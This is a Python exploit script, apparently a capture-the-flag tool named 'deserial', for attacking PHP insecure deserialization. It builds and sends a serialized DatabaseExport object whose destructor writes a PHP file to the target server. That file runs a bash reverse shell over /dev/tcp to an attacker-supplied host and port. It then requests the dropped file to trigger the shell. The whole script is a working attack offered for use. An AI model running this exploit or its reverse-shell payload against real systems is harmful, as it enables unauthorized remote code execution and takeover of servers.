#!/usr/bin/python3

import sys
import os
from urllib.parse import urlparse

banner = """

⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢦⠙⢿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⢯⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢃⠛⢿⣿⣿⣿⣿⣿
⣿⣿⣿⢧⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡕⠂⠈⢻⣿⣿⣿⣿
⣿⣿⡅⣻⡿⢿⣿⣿⣿⡿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠿⢿⣿⡇⠀⠀⠈⣿⣿⣿⣿
⣿⣿⠀⠀⠀⠘⣿⣿⣿⣿⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⣹⣿⣿⣿
⣿⣿⠀⠀⠀⠀⣿⣿⡿⠿⠛⠻⣿⣿⣿⣿⡿⠟⠁⠈⠀⠉⠻⡆⠀⠀⠀⣿⣿⣿
⣿⣯⠄⠂⠀⠀⣿⡋⠀⢀⠀⠀⠀⠉⣿⣿⡀⠀⠀⠘⠓⣠⣶⣿⡀⠀⠀⠘⣿⣿
⣿⣫⡆⠀⠀⢀⣿⣷⣶⣄⠀⢀⣤⣴⣿⣿⣿⣶⣄⠀⣴⣿⣿⣿⠁⠀⠀⠀⠘⣿
⣿⣿⠁⠀⠀⡤⠙⢿⣿⣿⣷⣾⣿⡿⣿⣿⢿⠿⣿⣧⣿⣿⡿⢣⠀⠀⠀⠀⢠⣿
⣷⣌⠈⠀⠀⠀⠀⣆⠈⡉⢹⣿⣿⣆⡀⠀⠀⢠⣿⣿⣿⡿⢃⣼⠀⠀⠀⠀⣸⣿
⣿⣿⡇⠀⠀⠀⠀⠙⢿⣿⣆⠈⠛⠛⠛⠀⠀⠈⠉⠁⠀⢠⣿⠇⠀⠀⠀⠹⢿⡇
⣿⡫⠀⠀⠁⠀⠀⠀⠈⠻⣿⢢⣄⠀⠀⠀⠀⠀⣀⣠⣾⡾⠋⠀⠀⠀⠀⢀⠴⠋
⣿⣁⠄⠀⠀⠀⣀⠀⠀⠀⠈⠛⠿⣿⣿⣿⣿⣿⠿⡿⠋⠀⠀⠀⠀⠀⣀⠬⠆⢀
⣿⣿⣧⣄⠀⠀⠉⠀⠀⠀⠀⠀⠀⠈⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠠⠙
     _                     _       _ 
  __| | ___  ___  ___ _ __(_) __ _| |
 / _` |/ _ \/ __|/ _ \ '__| |/ _` | |
| (_| |  __/\__ \  __/ |  | | (_| | |
 \__,_|\___||___/\___|_|  |_|\__,_|_|

[+]For attack to php deserial   
   
"""
if len(sys.argv) != 4:
    usage = f"""
    [!]Need more argument
    [-]Usage: {sys.argv[0]} <LHOST> <PORT> <TargetURL>
    [+]Example: {sys.argv[0]} 10.10.14.45 1234 http://target.com/vuln.php?cmd=
    """

    print(usage)
    sys.exit()
os.system("clear")
print(banner)

lhost = sys.argv[1]
lport = sys.argv[2]
target_url = sys.argv[3]

o = urlparse(target_url)

url = o.scheme + "://" + o.netloc + "/exploit.php"

f = open("exploit.php","w")


payload = "<?php" + "\n"

f.write(payload)

payload = "class DatabaseExport" + "\n"

f.write(payload)

payload = "{" + "\n"

f.write(payload)

payload = "\t"+"public $user_file = 'exploit.php';" + "\n"

f.write(payload)

payload = "\t"+"public $data = '<?php exec(\"/bin/bash -c \\'bash -i > /dev/tcp/"+lhost+"/"+lport+" 0>&1\\'\"); ?>';" + "\n"

f.write(payload)

payload = "\t" + "public function __destruct()" + "\n"

f.write(payload)

payload = "\t" + "{" + "\n"

f.write(payload)

payload = "\t" + "\t" + "file_put_contents(__DIR__ . '/' . $this ->user_file, $this->data);" + "\n"

f.write(payload)

payload = "\t" + "\t" + "echo '[EXPLOITED] Check your netcat !!!!!!!!!!!';" + "\n"

f.write(payload)

payload = "\t" + "}" + "\n"

f.write(payload)

payload = "}" + "\n"

f.write(payload)

payload = f"$url = '"+target_url+"' . urlencode(serialize(new DatabaseExport));" + "\n"

f.write(payload)

payload = "$response = file_get_contents(\"$url\");" + "\n"

f.write(payload)

payload = f"$response = file_get_contents(\"{url}\");" + "\n"

f.write(payload)

payload = "?>" + "\n"

f.write(payload)

f.close()



os.system("php exploit.php")
os.system("rm exploit.php")
